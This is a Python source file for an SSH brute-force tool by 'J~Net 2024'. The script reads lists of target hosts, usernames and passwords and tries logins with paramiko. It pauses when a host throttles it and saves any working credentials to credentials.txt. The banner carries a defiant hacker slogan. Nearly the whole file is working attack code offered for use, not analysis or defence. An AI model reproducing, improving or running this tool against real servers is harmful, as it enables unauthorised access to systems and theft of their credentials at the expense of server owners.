#!/usr/bin/python

# // Code by J~Net 2024
# // GitHub: https://github.com/jamieduk/SSH-BruteForce_V2_Python3

import os
import time
import sys
from sys import stdout
from sys import platform

try:
    import socket
    import paramiko
except ImportError:
    print(f'Please run command: sudo bash install.sh')
    sys.exit()

# Colors
red="\033[0;31m"
green="\033[0;32m"
yellow="\033[0;33m"
blue="\033[0;34m"
purple="\033[0;35m"
cyan="\033[0;36m"
white="\033[0;37m"
nc="\033[00m"

# Fragments
ask=f"{green}[{white}?{green}] {yellow}"
success=f"{yellow}[{white}√{yellow}] {green}"
error=f"{blue}[{white}!{blue}] {red}"
info=f"{yellow}[{white}+{yellow}] {cyan}"
info2=f"{green}[{white}•{green}] {purple}"

# Clear console
def clear():
    os.system('clear')

# Print lines slowly
def sprint(text):
    """Print lines slowly"""
    for line in text + '\n':
        stdout.write(line)
        stdout.flush()
        time.sleep(0.03)

def check_os():
    """Checks Operating Systems"""
    os_platform=platform
    if os_platform == 'win'.lower() and 'win32'.lower():
        sprint(f'\n{error}Are you seriously bro? Do you want to run bruteforce on Windows? Go to ass bro!\n')
        sys.exit()

clear()
check_os()

# Generated by banner-generator.
logo=f'''
{nc}
       ____ ____  _   _   ____             _        __                         
      / ___/ ___|| | | | | __ ) _ __ _   _| |_ ___ / _| ___  _ __ ___ ___ _ __ 
      \___ \___ \| |_| | |  _ \| '__| | | | __/ _ \ |_ / _ \| '__/ __/ _ \ '__|
       ___) |__) |  _  | | |_) | |  | |_| | ||  __/  _| (_) | | | (_|  __/ |   
      |____/____/|_| |_| |____/|_|   \__,_|\__\___|_|  \___/|_|  \___\___|_| 

                                                                       {nc}[v] 2.0 
                                                    {nc}By J~NET 2024

            {nc}*****************************************************                    
            {nc}*             {yellow}Telegram: jamied_uk              {nc}*
            {nc}*     {yellow}GitHub: https://github.com/jamieduk/        {nc}*
            {nc}*****************************************************

'''

print(logo)

# Variable tab 
TAB='\t'

sprint(f'''{TAB}{cyan}You may stop this individual, but you can't stop us all... after all, we're all alike.\n''')

# Define default file paths
default_targets_file='targets.txt'
default_usernames_file='username_list.txt'
default_path_file='passwords.txt'

# Function main
def main():
    try:
        # Prompt user for input with defaults
        targets_file=input(f'{info2}{nc}Enter Targets File Path (e.g., targets.txt) [{default_targets_file}]: {yellow}') or default_targets_file
        usernames_file=input(f'\n{info2}{nc}Enter Usernames File Path (e.g., username_list.txt) [{default_usernames_file}]: {yellow}') or default_usernames_file
        path_file=input(f'\n{info2}{nc}Enter the Password.txt path [{default_path_file}]: {yellow}') or default_path_file

        n='\n'
        print(n)

        # Check file existence and handle errors
        if not os.path.exists(targets_file):
            sprint(f'\n{error}No such file! Please enter the right path for targets.\n')
            time.sleep(0.5)
            clear()
            print(logo)
            main()

        if not os.path.exists(usernames_file):
            sprint(f'\n{error}No such file! Please enter the right path for usernames.\n')
            time.sleep(0.5)
            clear()
            print(logo)
            main()

        if not os.path.exists(path_file):
            sprint(f'\n{error}No such file! Please enter the right path for passwords.\n')
            time.sleep(0.5)
            clear()
            print(logo)
            main()

    except KeyboardInterrupt:
        sprint(f'\n{success}Exit!\n')
        sys.exit()

    def sshbrute_forcer(host, username, password):
        """Function to brute force SSH"""
        port='22'  # port ssh
        ssh=paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(hostname=host, username=username, password=password, timeout=3)
        except socket.timeout:
            print(f"\n{error}{red}Not found {host} or timeout connection. Skipping to next host.\n")
            return False  # Skip to next host
        except paramiko.AuthenticationException:
            print(f'{error}[ATTEMPT] host {host} - login "{username}" - pass "{password}"')
            return False
        except paramiko.SSHException as e:
            if 'Error reading SSH protocol banner' in str(e):
                print(f"{error}Error reading SSH protocol banner from {host}. Skipping to next host.")
                return False
            else:
                print(f"{error} Too many queries. Waiting two minutes...")
                time.sleep(120)
                return False
        else:
            sprint(f"\n{success}[{port}] host: {host} login: {username} password: {password}\n")
            print(f"{success}I saved it to the file credentials.txt\n{info}You can check: cat credentials.txt\n")
            with open("credentials.txt", "a") as file:
                file.write(f'Host: {host}, Login: {username} Password: {password}\n')
            return True

    # Read files
    with open(targets_file) as f:
        targets=f.read().splitlines()

    with open(usernames_file) as f:
        usernames=f.read().splitlines()

    with open(path_file) as f:
        passlist=f.read().splitlines()

    # Iterate over targets and usernames
    for host in targets:
        attempt_count=0  # Initialize attempt counter for each host
        for username in usernames:
            for password in passlist:
                if attempt_count >= 9:
                    print(f"{info}Maximum attempts reached for host {host}. Moving to next host.\n")
                    break

                if sshbrute_forcer(host, username, password):
                    break

                attempt_count += 1

            if attempt_count >= 9:
                break

        # Move to the next host
        continue

# Call function main
main()

